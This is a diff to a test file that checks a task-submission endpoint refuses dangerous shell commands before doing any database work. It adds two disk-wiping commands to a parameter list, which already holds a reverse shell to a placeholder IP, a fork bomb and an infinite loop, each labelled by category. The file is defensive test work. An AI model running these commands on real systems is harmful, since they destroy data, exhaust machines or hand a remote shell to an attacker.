@@ -875,6 +875,11 @@ def test_task_submit_rejects_unknown_lane_before_database_work(
     ("bash -i >& /dev/tcp/10.0.0.1/9 0>&1", "exfiltration"),
     (":(){ :|:& };:", "resource_exhaustion"),
     ("while true; do :; done", "resource_exhaustion"),
+    # L-CMD-01/#233: root-filesystem wipe forms equivalent to `rm -rf /` —
+    # reconciled as already-fixed in kartikeya, pinned here end to end through
+    # willow's own submit-time wiring rather than just kartikeya's own suite.
+    ("find / -delete", "destructive"),
+    ("cat /dev/zero > /dev/sda", "destructive"),
 ])
 def test_task_submit_scans_at_submit_time(app_id, monkeypatch, task, category):
     # Defense-in-depth: a dangerous task is refused at submit BEFORE any DB work,
